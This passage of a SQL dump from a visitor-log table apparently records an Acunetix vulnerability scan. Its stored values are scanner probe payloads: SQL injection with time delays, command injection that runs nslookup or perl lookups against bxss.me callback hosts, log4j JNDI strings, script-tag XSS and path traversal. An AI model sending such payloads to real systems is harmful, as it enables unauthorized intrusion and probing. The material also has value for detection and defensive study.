10:37:40'),(206,'^(#$!@#$)(()))******','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:40'),(207,'\";print(md5(31337));$a=\"','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:41'),(208,'-1\' OR 2+109-109-1=0+0+0+1 --','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:04'),(209,'../496030994','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:04'),(210,'visitorsLog/.','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:42'),(211,'http://bxss.me/t/fit.txt?.jpg','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:40'),(212,'(nslookup hitlnfgizkcah7f5d3.bxss.me||perl -e \"gethostbyname(\'hitlnfgizkcah7f5d3.bxss.me\')\")','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:04'),(213,'${@print(md5(31337))}','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:42'),(214,'-1\' OR 2+545-545-1=0+0+0+1 or \'h4RnYzmm\'=\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:04'),(215,'$(nslookup hityktztfsgip3f4d7.bxss.me||perl -e \"gethostbyname(\'hityktztfsgip3f4d7.bxss.me\')\")','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:04'),(216,'bxss.me','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:40'),(217,'-1\" OR 2+926-926-1=0+0+0+1 --','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:04'),(218,'${@print(md5(31337))}\\','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:42'),(219,'&(nslookup hitzegjwhvzajdcdda.bxss.me||perl -e \"gethostbyname(\'hitzegjwhvzajdcdda.bxss.me\')\")&\'\\\"`0&(nslookup hitzegjwhvzajdcdda.bxss.me||perl -e \"gethostbyname(\'hitzegjwhvzajdcdda.bxss.me\')\"','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:04'),(220,'/xfs.bxss.me','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:41'),(221,'if(now()=sysdate(),sleep(15),0)','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:39'),(222,'\'.print(md5(31337)).\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:42'),(223,'|(nslookup hitoddjpwibmya98b2.bxss.me||perl -e \"gethostbyname(\'hitoddjpwibmya98b2.bxss.me\')\")','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:05'),(224,'496030994\'\"()&%<acx><ScRiPt >bQnC(9879)</ScRiPt>','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:05'),(225,'\'\"','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:41'),(226,'0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:40'),(227,'\"+\"A\".concat(70-3).concat(22*4).concat(99).concat(80).concat(118).concat(66)+(require\"socket\"\nSocket.gethostbyname(\"hitkz\"+\"lhrobkzj8a2f1.bxss.me.\")[3].to_s)+\"','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:05'),(228,'\'\"()&%<acx><ScRiPt >bQnC(9337)</ScRiPt>','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:05'),(229,'`(nslookup hitmanrindylf9ec3a.bxss.me||perl -e \"gethostbyname(\'hitmanrindylf9ec3a.bxss.me\')\")`','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:05'),(230,'1YQalovQO','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:05'),(231,'<!--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:42'),(232,'HttP://bxss.me/t/xss.html?%00','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:42'),(233,'0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:40'),(234,'\'+\'A\'.concat(70-3).concat(22*4).concat(120).concat(88).concat(119).concat(69)+(require\'socket\'\nSocket.gethostbyname(\'hitlp\'+\'firhvjqw5e33c.bxss.me.\')[3].to_s)+\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:05'),(235,'4960309949540929','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:05'),(236,';(nslookup hitaqpvqxoiuc6c09a.bxss.me||perl -e \"gethostbyname(\'hitaqpvqxoiuc6c09a.bxss.me\')\")|(nslookup hitaqpvqxoiuc6c09a.bxss.me||perl -e \"gethostbyname(\'hitaqpvqxoiuc6c09a.bxss.me\')\")&(nsl','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:05'),(237,'bxss.me/t/xss.html?%00','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:43'),(238,'(select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'\"+(select(0)from(select(sleep(15)))v)+\"*/','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:41'),(239,'-1; waitfor delay \'0:0:15\' --','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:41'),(240,'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:05','2022-08-11 10:37:05'),(241,'-1); waitfor delay \'0:0:15\' --','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:06','2022-08-11 10:37:42'),(242,'1 waitfor delay \'0:0:15\' --','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:06','2022-08-11 10:37:42'),(243,'CY7swiLK\'; waitfor delay \'0:0:15\' --','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:06','2022-08-11 10:37:06'),(244,'-5 OR 616=(SELECT 616 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:06','2022-08-11 10:37:06'),(245,'-5) OR 324=(SELECT 324 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:06','2022-08-11 10:37:06'),(246,'-1)) OR 540=(SELECT 540 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:07','2022-08-11 10:37:07'),(247,'RCwOCGkS\' OR 964=(SELECT 964 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:07','2022-08-11 10:37:07'),(248,'qXbDUstk\') OR 622=(SELECT 622 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:07','2022-08-11 10:37:07'),(249,'ky39rtm8\')) OR 187=(SELECT 187 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:07','2022-08-11 10:37:07'),(250,'496030994*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),15)','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:07','2022-08-11 10:37:07'),(251,'496030994\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:07','2022-08-11 10:37:07'),(252,'1\'\"','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:07','2022-08-11 10:37:47'),(253,'1\0','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:08','2022-08-11 10:37:40'),(254,'@@4ysIj','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:08','2022-08-11 10:37:08'),(255,'${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}//dns.log4j..-2143..cb284${::-.}1${::-.}bxss.me}}','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:11','2022-08-11 10:37:11'),(256,'1053629993','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/9','Windows','NT 10.0','2022-08-11 10:37:24','2022-08-11 10:38:28'),(257,'1431747239','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/10','Windows','NT 10.0','2022-08-11 10:37:25','2022-08-11 10:38:27'),(258,'${10000147+9999866}','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:35','2022-08-11 10:37:35'),(259,'${j${::-n}di:dns${::-:}//hitfsygijkmkd01e27${::-.}bxss.me}zzzz','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:35','2022-08-11 10:37:35'),(260,'response.write(9951368*9779101)','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:35','2022-08-11 10:37:35'),(261,'659996680<esi:include src=\"http://bxss.me/rpb.png\"/>','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:35','2022-08-11 10:37:35'),(262,'659996680&n903094=v915465','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:35','2022-08-11 10:37:35'),(263,'\'.gethostbyname(lc(\'hitlj\'.\'gtkxdsuv313e0.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(114).chr(70).chr(100).chr(87).\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:35','2022-08-11 10:37:35'),(264,'echo szygfj$()\\ ymbohy\\nz^xyu||a #\' &echo szygfj$()\\ ymbohy\\nz^xyu||a #|\" &echo szygfj$()\\ ymbohy\\nz^xyu||a #','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:35','2022-08-11 10:37:35'),(265,'MmxXzpFF','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:35','2022-08-11 10:37:35'),(266,'-1 OR 2+236-236-1=0+0+0+1 --','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:35','2022-08-11 10:37:35'),(267,'\".gethostbyname(lc(\"hitci\".\"jzdtwonk3f818.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(120).chr(65).chr(103).chr(88).\"','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:35','2022-08-11 10:37:35'),(268,'&echo khvgvp$()\\ iicvnw\\nz^xyu||a #\' &echo khvgvp$()\\ iicvnw\\nz^xyu||a #|\" &echo khvgvp$()\\ iicvnw\\nz^xyu||a #','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:36','2022-08-11 10:37:36'),(269,'-1 OR 2+98-98-1=0+0+0+1','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:36','2022-08-11 10:37:36'),(270,'12345\'\"\\\'\\\");|]*\0{\r\n<\0>','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:36','2022-08-11 10:37:36'),(271,'\'+response.write(9951368*9779101)+\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:36','2022-08-11 10:37:36'),(272,'|echo gnvlie$()\\ cfiykh\\nz^xyu||a #\' |echo gnvlie$()\\ cfiykh\\nz^xyu||a #|\" |echo gnvlie$()\\ cfiykh\\nz^xyu||a #','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:36','2022-08-11 10:37:36'),(273,'-1\' OR 2+504-504-1=0+0+0+1 --','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:36','2022-08-11 10:37:36'),(274,'../659996680','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:36','2022-08-11 10:37:36'),(275,'\"+response.write(9951368*9779101)+\"','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:36','2022-08-11 10:37:36'),(276,'(nslookup hitasyghghppre4841.bxss.me||perl -e \"gethostbyname(\'hitasyghghppre4841.bxss.me\')\")','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:36','2022-08-11 10:37:36'),(277,'-1\' OR 2+672-672-1=0+0+0+1 or \'i5yJOGMX\'=\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:36','2022-08-11 10:37:36'),(278,'$(nslookup hitkozfbszdmv04fe1.bxss.me||perl -e \"gethostbyname(\'hitkozfbszdmv04fe1.bxss.me\')\")','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:36','2022-08-11 10:37:36'),(279,'-1\" OR 2+285-285-1=0+0+0+1 --','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:36','2022-08-11 10:37:36'),(280,'&(nslookup hituuzsejbynsecf25.bxss.me||perl -e \"gethostbyname(\'hituuzsejbynsecf25.bxss.me\')\")&\'\\\"`0&(nslookup hituuzsejbynsecf25.bxss.me||perl -e \"gethostbyname(\'hituuzsejbynsecf25.bxss.me\')\"','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:37','2022-08-11 10:37:37'),(281,'659996680\'\"()&%<acx><ScRiPt >XIy7(9602)</ScRiPt>','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:37','2022-08-11 10:37:37'),(282,'\"+\"A\".concat(70-3).concat(22*4).concat(106).concat(81).concat(100).concat(82)+(require\"socket\"\nSocket.gethostbyname(\"hitty\"+\"tprnjpdgd258c.bxss.me.\")[3].to_s)+\"','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:37','2022-08-11 10:37:37'),(283,'|(nslookup hitxybwifihdqb8339.bxss.me||perl -e \"gethostbyname(\'hitxybwifihdqb8339.bxss.me\')\")','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:37','2022-08-11 10:37:37'),(284,'\'\"()&%<acx><ScRiPt >XIy7(9054)</ScRiPt>','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:37','2022-08-11 10:37:37'),(285,'`(nslookup hithlulhapxcl5309f.bxss.me||perl -e \"gethostbyname(\'hithlulhapxcl5309f.bxss.me\')\")`','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:37','2022-08-11 10:37:37'),(286,'\'+\'A\'.concat(70-3).concat(22*4).concat(100).concat(76).concat(99).concat(84)+(require\'socket\'\nSocket.gethostbyname(\'hitsw\'+\'ukyctsyyc3fc5.bxss.me.\')[3].to_s)+\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:37','2022-08-11 10:37:37'),(287,'6599966809326119','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 